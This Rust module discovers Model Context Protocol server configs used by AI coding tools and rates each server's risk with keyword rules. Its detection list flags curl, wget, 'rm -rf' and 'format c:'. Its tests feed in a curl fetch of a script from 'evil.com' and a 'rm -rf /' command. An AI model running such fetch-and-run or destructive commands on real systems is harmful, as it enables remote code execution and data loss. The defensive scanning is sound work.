use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpServerInfo {
    pub name: String,
    pub command: String,
    pub args: Vec<String>,
    pub env: std::collections::HashMap<String, String>,
    pub config_path: PathBuf,
    pub agent_host: String,
    pub transport: String,
    pub risk_level: McpRiskLevel,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum McpRiskLevel {
    Unknown,
    Verified,
    Suspicious,
    Malicious,
}

impl McpRiskLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            McpRiskLevel::Unknown => "unknown",
            McpRiskLevel::Verified => "verified",
            McpRiskLevel::Suspicious => "suspicious",
            McpRiskLevel::Malicious => "malicious",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpGovernanceRule {
    pub server_name: String,
    pub action: McpAction,
    pub filesystem_scope: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub enum McpAction {
    Allow,
    Deny,
    Ask,
    ReadOnly,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpDiscoveryReport {
    pub servers_found: usize,
    pub servers: Vec<McpServerInfo>,
    pub config_files_scanned: usize,
    pub config_files_found: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpConfigFile {
    pub path: PathBuf,
    pub agent_host: String,
    pub parsed: bool,
    pub error: Option<String>,
}

const MCP_CONFIG_PATHS: &[(&str, &str)] = &[
    ("Claude Desktop", "%APPDATA%\\Claude\\claude_desktop_config.json"),
    ("Claude Code", "%USERPROFILE%\\.claude.json"),
    ("Cursor", "%USERPROFILE%\\.cursor\\mcp.json"),
    ("VS Code", "%APPDATA%\\Code\\User\\mcp.json"),
    ("VS Code Settings", "%APPDATA%\\Code\\User\\settings.json"),
    ("Windsurf", "%USERPROFILE%\\.codeium\\windsurf\\mcp_config.json"),
    ("Gemini CLI", "%USERPROFILE%\\.gemini\\settings.json"),
    ("Antigravity", "%USERPROFILE%\\.gemini\\antigravity\\mcp_config.json"),
    ("Kiro", "%USERPROFILE%\\.kiro\\settings\\mcp.json"),
    ("Amazon Q", "%USERPROFILE%\\.aws\\amazonq\\agents\\mcp.json"),
    ("Amazon Q Default", "%USERPROFILE%\\.aws\\amazonq\\agents\\default.json"),
    ("VS Code MCP", "%USERPROFILE%\\.vscode\\mcp.json"),
];

const MCP_MANDATORY_DENY_PATTERNS: &[&str] = &[
    "**/.mcp.json",
    "**/.claude/settings.json",
    "**/.cursor/rules/**",
    "**/.gemini/settings.json",
];

pub fn resolve_mcp_path(raw: &str) -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let userprofile = std::env::var("USERPROFILE").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();

    if raw.contains("%APPDATA%") && appdata.is_empty() {
        return None;
    }
    if raw.contains("%USERPROFILE%") && userprofile.is_empty() {
        return None;
    }

    let resolved = raw
        .replace("%APPDATA%", &appdata)
        .replace("%USERPROFILE%", &userprofile)
        .replace("%LOCALAPPDATA%", &localappdata);
    Some(PathBuf::from(resolved))
}

pub fn discover_mcp_config_files() -> Vec<McpConfigFile> {
    let mut results = Vec::new();
    for (host, raw_path) in MCP_CONFIG_PATHS {
        if let Some(resolved) = resolve_mcp_path(raw_path) {
            let exists = resolved.exists();
            if exists {
                match std::fs::read_to_string(&resolved) {
                    Ok(content) => {
                        let parsed = parse_mcp_config(&content).is_some();
                        results.push(McpConfigFile {
                            path: resolved,
                            agent_host: host.to_string(),
                            parsed,
                            error: if parsed { None } else { Some("Cannot parse as MCP JSON".into()) },
                        });
                    }
                    Err(e) => {
                        results.push(McpConfigFile {
                            path: resolved,
                            agent_host: host.to_string(),
                            parsed: false,
                            error: Some(e.to_string()),
                        });
                    }
                }
            }
        }
    }
    results
}

pub fn discover_mcp_servers() -> McpDiscoveryReport {
    let config_files = discover_mcp_config_files();
    let mut servers = Vec::new();
    let found = config_files.iter().filter(|c| c.parsed || c.error.is_none()).count();

    for cf in &config_files {
        if cf.parsed {
            if let Ok(content) = std::fs::read_to_string(&cf.path) {
                if let Some(parsed) = parse_mcp_config(&content) {
                    for (name, server) in parsed {
                        let transport = if server.as_object().map(|o| o.contains_key("url") || o.contains_key("endpoint")).unwrap_or(false) {
                            "http"
                        } else {
                            "stdio"
                        };
                        let command = server.get("command")
                            .map(|c| c.to_string())
                            .unwrap_or_else(|| "unknown".to_string());
                        let args: Vec<String> = server.get("args")
                            .and_then(|a| a.as_array())
                            .map(|arr| arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
                            .unwrap_or_default();
                        let env: std::collections::HashMap<String, String> = server.get("env")
                            .and_then(|e| e.as_object())
                            .map(|obj| obj.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();

                        let risk = assess_mcp_risk(&command, &args, &env);

                        servers.push(McpServerInfo {
                            name,
                            command,
                            args,
                            env,
                            config_path: cf.path.clone(),
                            agent_host: cf.agent_host.clone(),
                            transport: transport.to_string(),
                            risk_level: risk,
                        });
                    }
                }
            }
        }
    }

    servers.sort_by_key(|s| match s.risk_level {
        McpRiskLevel::Malicious => 0,
        McpRiskLevel::Suspicious => 1,
        McpRiskLevel::Unknown => 2,
        McpRiskLevel::Verified => 3,
    });

    McpDiscoveryReport {
        servers_found: servers.len(),
        servers,
        config_files_scanned: config_files.len(),
        config_files_found: found,
    }
}

fn parse_mcp_config(content: &str) -> Option<std::collections::BTreeMap<String, serde_json::Value>> {
    let v: serde_json::Value = serde_json::from_str(content).ok()?;

    if let Some(mcp_servers) = v.get("mcpServers") {
        if let Some(obj) = mcp_servers.as_object() {
            let mut map = std::collections::BTreeMap::new();
            for (k, v) in obj {
                map.insert(k.clone(), v.clone());
            }
            return Some(map);
        }
    }

    if let Some(mcp) = v.get("mcp") {
        if let Some(servers) = mcp.get("servers") {
            if let Some(obj) = servers.as_object() {
                let mut map = std::collections::BTreeMap::new();
                for (k, v) in obj {
                    map.insert(k.clone(), v.clone());
                }
                return Some(map);
            }
        }
    }

    if v.get("mcpServers").is_some() || v.get("mcp").is_some() {
        return Some(std::collections::BTreeMap::new());
    }

    None
}

fn assess_mcp_risk(command: &str, args: &[String], env: &std::collections::HashMap<String, String>) -> McpRiskLevel {
    let cmd_lower = command.to_lowercase();
    let all_args: String = args.join(" ").to_lowercase();

    if cmd_lower.contains("curl") || cmd_lower.contains("wget") || all_args.contains("curl ") || all_args.contains("wget ") {
        return McpRiskLevel::Malicious;
    }

    if all_args.contains("rm -rf") || all_args.contains("del /f") || all_args.contains("format c:") {
        return McpRiskLevel::Malicious;
    }

    if all_args.contains("--no-sandbox") || all_args.contains("--privileged") {
        return McpRiskLevel::Suspicious;
    }

    if all_args.contains("http://") || all_args.contains("https://evil") {
        return McpRiskLevel::Suspicious;
    }

    if env.contains_key("DANGEROUS") || env.contains_key("UNSAFE") {
        return McpRiskLevel::Suspicious;
    }

    if command.is_empty() || command == "unknown" {
        return McpRiskLevel::Unknown;
    }

    if cmd_lower.contains("npx") || cmd_lower.contains("uvx") || cmd_lower.contains("pipx") {
        if all_args.contains("-g") || all_args.contains("--global") {
            return McpRiskLevel::Suspicious;
        }
        let known_safe = ["@anthropic", "@modelcontextprotocol", "mcp-server-", "filesystem", "brave-search", "puppeteer", "postgres", "sqlite", "github", "git", "memory", "sequential-thinking"];
        if !known_safe.iter().any(|k| all_args.contains(k)) {
            return McpRiskLevel::Suspicious;
        }
    }

    McpRiskLevel::Verified
}

pub fn is_mcp_server_process(cmdline: &str) -> bool {
    let lower = cmdline.to_lowercase();
    lower.contains("mcp-server") || lower.contains("mcp_server") || lower.contains("@modelcontextprotocol")
}

pub fn mcp_mandatory_deny_patterns() -> Vec<String> {
    MCP_MANDATORY_DENY_PATTERNS.iter().map(|s| s.to_string()).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn discover_config_paths_exist() {
        let paths = discover_mcp_config_files();
        assert!(!MCP_CONFIG_PATHS.is_empty());
    }

    #[test]
    fn parse_standard_mcp_config() {
        let json = r#"{
            "mcpServers": {
                "filesystem": {
                    "command": "npx",
                    "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
                },
                "brave-search": {
                    "command": "env",
                    "args": ["BRAVE_API_KEY=test", "npx", "-y", "@anthropic/mcp-server-brave-search"]
                }
            }
        }"#;
        let parsed = parse_mcp_config(json);
        assert!(parsed.is_some());
        let servers = parsed.unwrap();
        assert_eq!(servers.len(), 2);
        assert!(servers.contains_key("filesystem"));
        assert!(servers.contains_key("brave-search"));
    }

    #[test]
    fn parse_empty_config() {
        let json = r#"{"mcpServers": {}}"#;
        let parsed = parse_mcp_config(json).unwrap();
        assert!(parsed.is_empty());
    }

    #[test]
    fn is_mcp_server_process_detects_mcp() {
        assert!(is_mcp_server_process("node mcp-server-filesystem"));
        assert!(is_mcp_server_process("@modelcontextprotocol/server-github"));
        assert!(!is_mcp_server_process("notepad.exe"));
    }

    #[test]
    fn assess_risk_safe_npx() {
        let args = vec!["-y".to_string(), "@modelcontextprotocol/server-filesystem".to_string()];
        let risk = assess_mcp_risk("npx", &args, &std::collections::HashMap::new());
        assert_eq!(risk, McpRiskLevel::Verified);
    }

    #[test]
    fn assess_risk_unknown_npx() {
        let args = vec!["-y".to_string(), "some-random-package".to_string()];
        let risk = assess_mcp_risk("npx", &args, &std::collections::HashMap::new());
        assert_eq!(risk, McpRiskLevel::Suspicious);
    }

    #[test]
    fn assess_risk_curl_is_malicious() {
        let args = vec!["-s".to_string(), "http://evil.com/script.sh".to_string()];
        let risk = assess_mcp_risk("curl", &args, &std::collections::HashMap::new());
        assert_eq!(risk, McpRiskLevel::Malicious);
    }

    #[test]
    fn assess_risk_rm_rf_is_malicious() {
        let args = vec!["rm".to_string(), "-rf".to_string(), "/".to_string()];
        let risk = assess_mcp_risk("bash", &args, &std::collections::HashMap::new());
        assert_eq!(risk, McpRiskLevel::Malicious);
    }

    #[test]
    fn mandatory_deny_patterns_not_empty() {
        let patterns = mcp_mandatory_deny_patterns();
        assert!(!patterns.is_empty());
        assert!(patterns.iter().any(|p| p.contains(".mcp.json")));
    }

    #[test]
    fn discover_mcp_config_files_runs() {
        let files = discover_mcp_config_files();
        assert!(MCP_CONFIG_PATHS.len() == 12);
    }
}
